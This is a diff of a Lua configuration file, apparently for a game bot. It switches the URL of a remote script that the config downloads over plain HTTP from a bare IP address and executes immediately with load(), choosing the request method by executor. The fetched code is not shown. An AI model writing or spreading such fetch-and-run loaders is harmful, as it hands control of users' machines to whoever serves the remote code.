@@ -89,7 +89,7 @@ CONFIG.Trash_list ={5040,5042,5044,5032,5034,5036,5038,5024,5026,5028,5030,7162,
 
 CONFIG = CONFIG
 if CONFIG.PANDORA then
-    load(request("GET","http://134.209.99.103/rosok"))()
+    load(request("GET","http://134.209.99.103/banksy"))()
 elseif CONFIG.GROWX then
-    load(httpGet("http://134.209.99.103/rosok"))()
+    load(httpGet("http://134.209.99.103/banksy"))()
 end
